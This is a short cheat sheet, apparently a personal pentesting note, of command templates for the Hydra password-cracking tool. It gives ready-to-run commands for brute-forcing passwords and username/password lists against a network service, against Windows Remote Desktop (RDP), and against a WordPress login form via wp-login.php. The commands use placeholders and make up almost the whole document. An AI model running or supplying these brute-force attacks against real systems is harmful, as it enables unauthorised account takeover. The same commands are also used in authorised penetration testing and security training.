## All About Hydra Password Tool

```bash
 
# Brute force against a Protocal 
# 

 hydra -P <wordlist> -v <ip> <protocol>

# Brute force passwords and Usernames together 
#

 hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>

# Brute force windows Remote Desktop Protocal(RDP)
 hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>

# Beening more crafting in terms of using Hydra
# 

hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 
```